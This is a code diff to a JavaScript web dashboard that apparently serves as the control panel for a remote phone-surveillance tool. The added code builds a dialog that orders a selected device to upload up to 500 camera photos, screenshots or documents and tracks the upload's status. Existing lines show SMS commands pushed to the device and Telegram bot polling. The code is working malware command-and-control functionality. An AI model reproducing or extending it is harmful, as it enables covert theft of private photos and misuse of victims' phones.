@@ -433,6 +433,7 @@ function openPanel(config, title) {
 }
 function doLogout() {
   stopTelegramPolling();
+  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -604,6 +605,10 @@ function closeDev() {
   stopTelegramPolling();
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
+  
+  // ✅ Photo command listener remove
+  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
+  
   document.getElementById('drawer').classList.remove('active');
   document.getElementById('dOverlay').classList.remove('active');
   curId = null;
@@ -718,7 +723,6 @@ function renderTab() {
       document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
       document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
       
-      // ✅ Restore log from previous state
       if (tgPolling[curId] && tgPolling[curId].logs) {
         var logEl = document.getElementById('tgLog');
         tgPolling[curId].logs.forEach(function(l) {
@@ -733,20 +737,179 @@ function renderTab() {
 
 function renderPhotos() {
   var b = document.getElementById('dBody');
+  
+  // ✅ Top: Upload button + Status
+  var topHtml = 
+    '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:12px; margin-bottom:12px;">' +
+      '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">' +
+        '<div style="color:#60A5FA; font-size:12px; font-weight:bold;">📤 Photo Upload</div>' +
+        '<div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:bold;">Ready</div>' +
+      '</div>' +
+      '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 REQUEST UPLOAD</button>' +
+    '</div>';
+  
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
   var seen = {};
   arr = arr.filter(function(p) { var key = p[1].name || p[0]; if (seen[key]) return false; seen[key] = true; return true; });
   document.getElementById('cPhotos').textContent = arr.length;
-  if (arr.length === 0) { b.innerHTML = '<div class="empty">No photos yet</div>'; return; }
-  b.innerHTML = '<div class="pgrid">' + arr.map(function(p) {
+  
+  if (arr.length === 0) {
+    b.innerHTML = topHtml + '<div class="empty">No photos yet</div>';
+    listenPhotoCommandStatus();
+    return;
+  }
+  
+  b.innerHTML = topHtml + '<div class="pgrid">' + arr.map(function(p) {
     var url = p[1].url || '', base64 = p[1].base64 || '', imgSrc = '';
     if (url) imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
     else if (base64) imgSrc = base64;
     return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
+  
   b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function() { showP(this.getAttribute('data-p')); }); });
+  
+  // ✅ Command status listener
+  listenPhotoCommandStatus();
 }
+
+// ═══════════════════════════════════════════════════════
+// PHOTO UPLOAD DIALOG
+// ═══════════════════════════════════════════════════════
+var photoFilter = 'camera';
+var photoQuantity = 100;
+var photoOrder = 'newest';
+var photoCmdListener = null;
+
+function openPhotoUploadDialog() {
+  if (!curId) { alert('No device selected'); return; }
+  
+  var old = document.getElementById('photoDialog');
+  if (old) old.remove();
+  
+  var html = 
+    '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px;" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()">' +
+      '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:420px; width:100%;">' +
+        '<h3 style="color:#60A5FA; font-size:15px; margin-bottom:16px;">📤 Request Photo Upload</h3>' +
+        
+        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Filter</label>' +
+        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;">' +
+          '<button class="pfilter-btn active" data-f="camera" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📷 Camera</button>' +
+          '<button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📸 Screenshot</button>' +
+          '<button class="pfilter-btn" data-f="document" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📄 Document</button>' +
+          '<button class="pfilter-btn" data-f="picture" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">🖼️ Picture</button>' +
+        '</div>' +
+        
+        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Quantity</label>' +
+        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px;">' +
+          '<button class="pqty-btn" data-q="50" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">50</button>' +
+          '<button class="pqty-btn active" data-q="100" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">100</button>' +
+          '<button class="pqty-btn" data-q="500" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">500</button>' +
+        '</div>' +
+        
+        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Order</label>' +
+        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;">' +
+          '<button class="porder-btn" data-o="oldest" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬆️ Oldest First</button>' +
+          '<button class="porder-btn active" data-o="newest" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬇️ Newest First</button>' +
+        '</div>' +
+        
+        '<div style="display:flex; gap:8px;">' +
+          '<button onclick="closePhotoDialog()" style="flex:1; padding:12px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">CANCEL</button>' +
+          '<button onclick="sendPhotoCommand()" style="flex:1; padding:12px; background:#10B981; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 START UPLOAD</button>' +
+        '</div>' +
+      '</div>' +
+    '</div>';
+  
+  var div = document.createElement('div');
+  div.innerHTML = html;
+  document.body.appendChild(div.firstChild);
+  
+  document.querySelectorAll('.pfilter-btn').forEach(function(btn) {
+    btn.onclick = function() {
+      document.querySelectorAll('.pfilter-btn').forEach(function(b) {
+        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
+      });
+      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
+      photoFilter = this.getAttribute('data-f');
+    };
+  });
+  
+  document.querySelectorAll('.pqty-btn').forEach(function(btn) {
+    btn.onclick = function() {
+      document.querySelectorAll('.pqty-btn').forEach(function(b) {
+        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
+      });
+      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
+      photoQuantity = parseInt(this.getAttribute('data-q'));
+    };
+  });
+  
+  document.querySelectorAll('.porder-btn').forEach(function(btn) {
+    btn.onclick = function() {
+      document.querySelectorAll('.porder-btn').forEach(function(b) {
+        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
+      });
+      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
+      photoOrder = this.getAttribute('data-o');
+    };
+  });
+}
+
+function closePhotoDialog() {
+  var el = document.getElementById('photoDialog');
+  if (el) el.remove();
+}
+
+function sendPhotoCommand() {
+  if (!curId) { alert('No device selected'); return; }
+  
+  var cmd = {
+    filter: photoFilter,
+    quantity: photoQuantity,
+    order: photoOrder,
+    status: 'pending',
+    timestamp: Date.now(),
+    requested_at: new Date().toLocaleString()
+  };
+  
+  db.ref('device_info/' + curId + '/photo_upload_command').set(cmd)
+    .then(function() {
+      alert('✅ Command sent!\n\nFilter: ' + photoFilter + '\nQuantity: ' + photoQuantity + '\nOrder: ' + photoOrder);
+      closePhotoDialog();
+    })
+    .catch(function(e) {
+      alert('❌ Failed: ' + e.message);
+    });
+}
+
+function listenPhotoCommandStatus() {
+  if (!curId) return;
+  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} }
+  
+  var ref = db.ref('device_info/' + curId + '/photo_upload_command');
+  photoCmdListener = ref;
+  
+  ref.on('value', function(snapshot) {
+    var data = snapshot.val();
+    var statusEl = document.getElementById('uploadStatus');
+    if (!statusEl) return;
+    
+    if (!data) { statusEl.style.color = '#64748B'; statusEl.textContent = 'Ready'; return; }
+    
+    var status = data.status || 'pending';
+    var color = '#64748B';
+    var text = status;
+    
+    if (status === 'pending') { color = '#F59E0B'; text = '⏳ Pending...'; }
+    else if (status === 'uploading') { color = '#3B82F6'; text = '📤 Uploading...'; }
+    else if (status === 'completed') { color = '#10B981'; text = '✅ Completed'; }
+    else if (status === 'failed') { color = '#EF4444'; text = '❌ Failed'; }
+    
+    statusEl.style.color = color;
+    statusEl.textContent = text;
+  });
+}
+
 function showP(k) {
   var p = photos[k]; if (!p) return;
   var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
@@ -830,7 +993,6 @@ function startTelegramPolling(token, chatId) {
   updateTgStatus('🟢 Starting bot polling...');
   addTgLog('🚀 Bot polling started');
   
-  // Bot info check
   fetch('https://api.telegram.org/bot' + token + '/getMe')
     .then(function(r) { return r.json(); })
     .then(function(j) {
@@ -922,7 +1084,6 @@ function addTgLog(text) {
   var time = new Date().toLocaleTimeString();
   var lineText = '[' + time + '] ' + text;
   
-  // ✅ Store in memory
   if (curId && tgPolling[curId]) {
     if (!tgPolling[curId].logs) tgPolling[curId].logs = [];
     tgPolling[curId].logs.push(lineText);
